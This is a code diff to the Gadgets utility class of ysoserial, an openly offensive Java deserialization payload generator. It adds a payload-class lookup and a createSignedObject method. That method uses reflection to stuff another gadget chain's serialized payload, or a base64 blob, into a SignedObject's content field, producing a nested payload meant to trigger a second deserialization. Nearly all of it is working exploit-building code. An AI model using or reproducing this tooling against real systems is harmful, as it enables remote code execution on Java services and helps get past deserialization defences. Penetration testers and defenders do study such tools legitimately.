@@ -4,13 +4,16 @@ package ysoserial.payloads.util;
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 import java.io.Serializable;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.Signature;
+import java.security.SignedObject;
+import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
+import java.util.logging.Filter;
 
 import com.nqzero.permit.Permit;
 import javassist.ClassClassPath;
@@ -24,6 +27,9 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.commons.codec.binary.Base64;
+import ysoserial.Serializer;
+import ysoserial.payloads.ObjectPayload;
 
 
 /*
@@ -101,7 +107,41 @@ public class Gadgets {
 
         return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
+    public static Class getTargetPayload(String arg) {
+        String payloadClass = arg.split(":")[0];
+        Class payloadClazz = null;
+        List<Class<? extends ObjectPayload>> payloadClasses =
+            new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
+        for (Class<?> clazz : payloadClasses) {
+            if ((("ysoserial.payloads."+payloadClass).toLowerCase()).equals(clazz.getName().toLowerCase())) {
+                payloadClazz = clazz;
+                break;
+            }
+        }
+        return payloadClazz;
+    }
 
+    public static SignedObject createSignedObject (String parmas) throws Exception {
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
+        kpg.initialize(1024);
+        KeyPair kp = kpg.generateKeyPair();
+        SignedObject signedObject = new SignedObject("J1an", kp.getPrivate(), Signature.getInstance("DSA"));
+        Field contentField=signedObject.getClass().getDeclaredField("content");
+        contentField.setAccessible(true);
+        if(parmas.toLowerCase().startsWith("base64:")){
+            parmas=(parmas.split(":",2)[1]);
+            contentField.set(signedObject, Base64.decodeBase64(parmas.getBytes()));
+        }
+        else {
+            Class payloadClazz = getTargetPayload(parmas);
+            if (payloadClazz == null) {
+                throw new IllegalArgumentException("Invalid payload type '" + parmas.split(":")[0] + "'");
+            }
+            Method getPayloadObj = payloadClazz.getMethod("getObject", String.class);
+            contentField.set(signedObject, (Serializer.serialize(getPayloadObj.invoke(payloadClazz.newInstance(), parmas.split(":", 2)[1]))));
+        }
+        return signedObject;
+    }
 
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
